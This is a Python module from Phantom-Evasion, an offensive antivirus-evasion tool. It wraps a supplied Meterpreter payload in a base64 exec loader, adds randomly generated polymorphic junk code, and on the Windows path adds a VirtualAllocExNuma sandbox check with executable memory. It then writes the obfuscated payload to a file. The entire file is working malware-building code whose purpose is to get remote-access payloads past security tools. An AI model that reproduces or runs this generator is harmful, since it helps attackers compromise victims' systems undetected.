
     ########################################################################################
     #                                                                                      #
     #    This file is part of Phantom-Evasion.                                             #
     #                                                                                      #
     #    Phantom-Evasion is free software: you can redistribute it and/or modify           #
     #    it under the terms of the GNU General Public License as published by              #
     #    the Free Software Foundation, either version 3 of the License, or                 #
     #    (at your option) any later version.                                               #
     #                                                                                      #
     #    Phantom-Evasion is distributed in the hope that it will be useful,                #
     #    but WITHOUT ANY WARRANTY; without even the implied warranty of                    #
     #    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the                     #
     #    GNU General Public License for more details.                                      #
     #                                                                                      #  
     #    You should have received a copy of the GNU General Public License                 #
     #   along with Phantom-Evasion.  If not, see <http://www.gnu.org/licenses/>.           #
     #                                                                                      #
     ########################################################################################
 

import sys
import string
from random import randint
sys.path.append("Modules/payloads/auxiliar")
from usefull import python_poly_multipath
from usefull import varname_creator
from base64 import b64encode


Pytherpreter = sys.argv[1]
Filename = sys.argv[2] 
wine = sys.argv[3]

Pytherpreter.replace("import base64,sys;exec","")
Pytherpreter= "exec(base64.b64decode(\"" + b64encode(Pytherpreter) + "\"))\n"

Randptr = varname_creator()
Randbytesnumb = str(randint(1000,9999))

MorphEvasion1 = python_poly_multipath(randint(1,3),1)
MorphEvasion2 = python_poly_multipath(randint(1,3),2)
MorphEvasion3 = python_poly_multipath(randint(1,3),3)

Hollow_code = ""

if wine == "True":

    Hollow_code += "import ctypes\n"
    Hollow_code += "import base64,sys;\n"
    Hollow_code += MorphEvasion1
    Hollow_code += MorphEvasion2
    Hollow_code += MorphEvasion3
    Hollow_code += "            " + Randptr + " = ctypes.windll.kernel32.VirtualAllocExNuma(ctypes.windll.kernel32.GetCurrentProcess(),ctypes.c_int(0)," + Randbytesnumb + ",ctypes.c_int(0x00001000|0x00002000),ctypes.c_int(0x40),0)\n"
    Hollow_code += "            if " + Randptr + " != ctypes.c_int(0):\n" 
    Hollow_code += "                " + Pytherpreter + "\n"
    Hollow_code = Hollow_code.encode('utf-8') 

else:

    Hollow_code += "import base64,sys;\n"
    Hollow_code += MorphEvasion1
    Hollow_code += MorphEvasion2
    Hollow_code += MorphEvasion3 
    Hollow_code += "           " + Pytherpreter + "\n"
    Hollow_code = Hollow_code.encode('utf-8') 

with open(Filename,'wb') as f:
    f.write(Hollow_code)

